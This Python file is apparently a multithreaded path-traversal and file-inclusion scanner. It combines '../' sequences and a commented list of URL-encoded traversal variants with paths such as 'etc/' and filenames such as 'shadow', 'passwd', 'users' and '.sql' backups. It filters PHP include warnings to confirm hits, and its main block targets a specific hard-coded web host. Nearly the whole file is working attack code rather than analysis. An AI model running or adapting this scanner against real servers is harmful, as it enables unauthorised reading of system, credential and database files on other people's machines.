import re
import argparse
import sys
import requests
from http.cookies import SimpleCookie
import time
import concurrent.futures
import multiprocessing
from functools import partial
from itertools import repeat


import threading

a = 0
b = 0

stuff = [
    "",
    "backup/",
    "services/",
    "database/",
    # "db/",
    # "backup-db/",
    "etc/",
    #"var/",
    #"var/log/",
    #"var/www/files/",
]
tecicky = [
    "",
    "../",
   # "../../",
   # "../../../",
   # "etc/",
   # "/..",
   # "....//",
   # "//....",
   # "%252e%252e%255c",
   # "%2e%2e%5c",
   # "..%255c",
   # "..%5c",
   # "%5c../",
   # "/%5c..",
   # "..\\",
   # "%2e%2e%2f",
#    "../../../../",
]
files = [
    "",
    "?file=",
    #"get-files",
    #"get-files?",
    #"file:",
    #"get-files?file=",

]

words = [
    "",
   # "services",
    "functions",
   # "default",
    "backup",
    "users",
   # "connect",
     "shadow",
   # "security",
   # "passwd",
   # "group",
   # "index",
   # #"admin",
   # "login",
   # "homes",
   # "dashboard",
   # #"text",
   # "delete",
   # #"update",
   # "remove",
   # "access",
   # #"apache",
   # "apache2",
]
suffix = [
    "",
    ".sql",
    #".py",
    #".php",
    #".html",
    #".txt",
    #".js",
    #".log",
    #".gif",


]



def count_searched():
    global a
    a += 1
    if a % 200 == 0:
        print("searching...    (" + str(a) + " searched)")


# Compare warning messages to content
def false_positives(end, content):
    warning_message = False
    too_long = False
    warning1 = "Warning: include(" + end + "): failed to open stream: No such file or directory in"
    warning2 = "Warning: include(): Failed opening \'" + end + "\' for inclusion"
    warning3 = "Warning: include("
    warning4 = "): failed to open stream: No such file or directory in"
    warning5 = "Warning: include(): Failed opening \'"

    if len(content) > 2000000:
        too_long = True
    if warning1 in content or warning2 in content:
        warning_message = True
    elif warning3 in content and warning4 in content and warning5 in content:
        warning_message = True
    if warning_message == False and too_long == False:
        return False
    else:
        return True


# Compare content with normal website content
def not_normal(content, normal_content):
    if content != normal_content:
        return True
    else:
        return False


# trim the normal website content
def content_adjustment(cur_content, norm_content):
    if norm_content in cur_content:
        shortened_content = cur_content.replace(norm_content, "\nNormal website content\nSHORTENED")
        return shortened_content
    else:
        return cur_content


def try_path(target_url, path, end):
    full_content = ""
    shortened_content = ""
    headers = ""
    #successful_path_list = []
    full_path = target_url + path
    request = requests.get(full_path)
    successful = False
    try:

        normal_content = normal_con(target_url)
        status = request.status_code
        if status != 400 and status != 403 and status != 404 and status != 500:
            # False positive tests
            # Isn't normal website content
            if not_normal(request.text, normal_content):
                # Isn't error message
                if false_positives(end, request.text) == False:
                    # all tests passed
                    """
                    print("\n" + full_path)
                    print("[+] Status Code: " + str(status))
                    for item, value in request.headers.items():
                        headers += "\n" + item + value
                    print("[+] Headers:" + headers)
                    Get rid of normal website content
                    content_body = content_adjustment(request.text, normal_content)
                    print("\n[+] Start of body: \n" + content_body + "\n[+] End of body")
                    try:
                        f = open("l.txt", "a")
                        f.write("\n----------------------------------------------------------------------------------------------")
                        f.write("\n" + full_path)
                        f.write("\n----------------------------------------------------------------------------------------------")
                        f.write("\n[+] Status Code: " + str(status) + "\n[+] Headers:" + headers +
                                "\n[+] Start of body: \n" + content_body + "\n[+] End of body")
                        f.close()
                    except:
                        print("Issue with a file")
                    """
                    request.close()
                    successful = True
        request.close()
    except:
        global b
        b += 1
        if b % 200 == 0:
            print(str(b) + " errors")
        request.close()
    return successful



def scan_for_file(url, file_name):
    successful_path_list = []
    for file in files:
        for dot in tecicky:
            #for word in words:
            for stu in stuff:
                #for suf in suffix:
                count_searched()
                cur_path = file + dot + stu + file_name
                cur_end = dot + stu + file_name
                result = try_path(url, cur_path, cur_end)
                if result:
                    successful_path_list.append(url + cur_path)
    return successful_path_list


def normal_con(url):
    content = requests.get(url)
    return content.text

"""
def try_all(url):
    for file in files:
        for dot in tecicky:
            for stu in stuff:
                for word in words:
                    for suf in suffix:
                        count_searched()
                        cur_path = file + dot + stu + word + suf
                        cur_end = dot + stu + word + suf
                        try_path(url, cur_path, cur_end)
"""


def threading(url):
    with concurrent.futures.ThreadPoolExecutor(max_workers=25) as executor:
        result = executor.map(add_suffix, repeat(url), words)
    tuple_of_lists = tuple(result)
    list_of_lists = list(tuple_of_lists)
    final_list = []
    for lis in list_of_lists:
        for item in lis:
            final_list.append(item)
    return final_list

def get_tried():
    global a
    return a

def full_scan(url):
    response = {'target_url': url, 'attack_type': 'full_scan'}
    successful = threading(url)
    response['tried'] = get_tried()
    if len(successful) > 0:
        response['status'] = True
        response['tried'] = str(get_tried())
        response['found'] = str(len(successful))
        response['found'] = successful
    else:
        response['status'] = False
        response['found'] = str(len(successful))
    print(response)

def custom_scan(url, custom):
    response = {'target_url': url, 'attack_type': 'custom'}
    successful = scan_for_file(url, custom)
    response['tried'] = get_tried()
    if len(successful) > 0:
        response['status'] = True
        response['tried'] = str(get_tried())
        response['found'] = str(len(successful))
        response['found'] = successful
    else:
        response['status'] = False
        response['found'] = str(len(successful))
    print(response)


def add_suffix(url, thread_file):
    succesfull = []
    for suf in suffix:
        file = thread_file + suf
        i = scan_for_file(url, file)
        succesfull.extend(i)
    return succesfull


def launch(target_url, attack_type, custom):
    response = {}
    try:
        r = requests.get(target_url)
        if attack_type == 'full_scan':
            response = full_scan(target_url)
        elif attack_type == 'custom':
            response = custom_scan(target_url, custom)
        else:
            response = {'error': True, 'description': 'Invalid attack type'}
    except requests.ConnectionError:
        response = {'error': True, 'description': 'Host not responding'}
    except requests.MissingSchema:
        response = {'error': True, 'description': 'Invalid URL'}
    finally:
        return response


if __name__ == '__main__':
    f = open("l.txt", "w")
    url = 'http://apache1.willilazarov.cz/'
    full_scan(url)
